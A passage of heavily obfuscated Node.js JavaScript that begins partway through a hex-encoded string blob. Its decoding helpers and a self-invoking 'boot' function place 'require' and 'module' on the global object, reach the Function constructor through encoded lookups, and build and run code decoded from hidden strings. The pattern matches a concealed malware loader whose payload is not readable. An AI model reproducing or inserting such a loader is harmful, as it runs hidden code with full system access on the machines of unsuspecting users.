cdcb91cd88cbcdcbcad0cad689dc959782c3e291df858cdc8ecd9591cbd8d6d8cfd7cb82cdd1d1df82cf95d384cb829990cb878881c3d1d693d6c285d8d2d4cad790d8d2cddc97cfd68092dcd889dad5d0d682dbcc9984e4fa98ded382c08a92d590dc8497c4ddcb84d08fd6d0fa81cbd7d789828f84d8cb9bc497cbdcd084e4eacdcacbd7d797828bcb84cd82e2cd82d0cf84c9cbfacbd79190d8cbdccdccc39299d1d5d2e292c184dc999481d3c291dcd3c0809191909099'];d$qtJhn$jgp=function(){return fYa_ecAuUpEYAjErRZhvFjWnMQ;};return d$qtJhn$jgp();}function splitLane(JIxUEcDsZqXSIbQVbGPjupV){var LtHdqNf$QeKg_OxYIOmLQSZZsf=DiRry,hNJRHyXb$$Wx=String[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1f2)](-0xe1b+-parseInt(0x18c3)+-parseInt(0xcfe)*-parseInt(0x3)),mfJLgOOKgjFDK_Jvn$kzS=spin(JIxUEcDsZqXSIbQVbGPjupV,NX);return mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('^')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)](hNJRHyXb$$Wx),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*1')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('^'),mfJLgOOKgjFDK_Jvn$kzS=mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)]('*0')[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e0)]('*'),mfJLgOOKgjFDK_Jvn$kzS[LtHdqNf$QeKg_OxYIOmLQSZZsf(0x1e7)](hNJRHyXb$$Wx);}function peel(HntnTJelobY){return spin(HntnTJelobY,SX);}(function boot(jRiqfL_YGi,ZXWEUnPbKMsgcWphWHTfi){var DWSBzXLkOBhNwMmvBZ=DiRry;jRiqfL_YGi['z']=z;var qrm_pgeLcAkZ=splitLane(DWSBzXLkOBhNwMmvBZ(0x1eb));jRiqfL_YGi[qrm_pgeLcAkZ[-parseInt(0x5a)*Math.ceil(0x5f)+0x1cf*Math.max(-parseInt(0x7),-parseInt(0x7))+parseInt(0x2e0f)]]=ZXWEUnPbKMsgcWphWHTfi;typeof module===qrm_pgeLcAkZ[-0xe9*Number(parseInt(0x1))+0x19a3*-0x1+-parseInt(0x1)*Number(-0x1a8d)]&&(jRiqfL_YGi[qrm_pgeLcAkZ[parseInt(0x24d7)+Math.trunc(parseInt(0x26d4))+Math.max(0xacf,parseInt(0xacf))*parseInt(-0x7)]]=module);var GWCvm$ZL=peel(DWSBzXLkOBhNwMmvBZ(0x1ec)),rcTIW_sQOoGcYZLAlPkfm$mi=GWCvm$ZL[DWSBzXLkOBhNwMmvBZ(0x1e5)](0x19*Math.ceil(0x82)+Math.ceil(0x1)*Math.ceil(0x18a9)+parseInt(-parseInt(0x255b)),0x312*-parseInt(0x7)+-parseInt(0x251d)+0x3aa6),paMowTbZVJuno=peel[rcTIW_sQOoGcYZLAlPkfm$mi],g$$RRgVGjkaechxpAIOIR=paMowTbZVJuno('',peel(DWSBzXLkOBhNwMmvBZ(0x1e3))),rLmqKRB_QxEIuMImVE$hGKNZAHT=g$$RRgVGjkaechxpAIOIR(peel(DWSBzXLkOBhNwMmvBZ(0x1f3)));return paMowTbZVJuno('',rLmqKRB_QxEIuMImVE$hGKNZAHT)(0x220d+parseInt(0x518)+Math.floor(-parseInt(0x4e4))*0x6),-parseInt(0x12e1)+-0xa34+Math.trunc(0x3ce3);}(global,require));
